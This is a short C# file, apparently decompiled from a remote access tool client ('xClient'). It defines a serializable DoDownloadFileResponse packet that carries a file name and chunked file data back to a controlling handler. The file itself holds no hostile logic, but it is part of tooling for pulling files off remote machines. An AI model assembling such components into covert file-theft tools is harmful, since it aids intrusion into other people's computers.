using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class DoDownloadFileResponse : GInterface4
{
	public int ID { get; set; }

	public string Filename { get; set; }

	public byte[] Block { get; set; }

	public int MaxBlocks { get; set; }

	public int CurrentBlock { get; set; }

	public string CustomMessage { get; set; }

	public DoDownloadFileResponse()
	{
	}

	public DoDownloadFileResponse(int id, string filename, byte[] block, int maxblocks, int currentblock, string custommessage)
	{
		ID = id;
		Filename = filename;
		Block = block;
		MaxBlocks = maxblocks;
		CurrentBlock = currentblock;
		CustomMessage = custommessage;
	}

	public void Execute(GClass33 client)
	{
		client.method_8(this);
	}
}
